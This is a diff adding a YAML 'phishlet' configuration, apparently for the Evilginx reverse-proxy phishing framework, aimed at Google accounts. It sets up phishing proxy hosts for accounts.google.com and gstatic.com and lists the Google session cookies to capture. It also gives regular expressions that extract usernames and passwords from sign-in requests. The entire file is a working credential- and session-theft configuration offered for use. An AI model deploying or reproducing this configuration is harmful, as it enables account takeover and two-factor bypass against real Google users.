@@ -1,0 +1,30 @@
+name: 'google'
+author: '@wilson'
+min_ver: '2.0.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}
+sub_filters:
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/signin/', replace: 'https://{hostname}/signin/', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/speedbump/', replace: 'https://{hostname}/speedbump/', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/CheckCookie', replace: 'https://{hostname}/CheckCookie', mimes: ['text/html', 'application/json']}
+  - {hostname: 'ssl.gstatic.com', sub: 'accounts', domain: 'google.com', search: 'href="http://{hostname}/_/signin/challenge', replace: 'href="http://{hostname}/_/signin/challenge', mimes: ['text/html', 'application/json']}
+  - {hostname: 'ssl.gstatic.com', sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID"]
+user_regex:
+  key: 'f.req'
+  re: '\],"([^"]*)"\]$'
+pass_regex:
+  key: 'f.req'
+  re: ',\["([^"]*)",'
+landing_path:
+  - '/signin/v2/identifier'
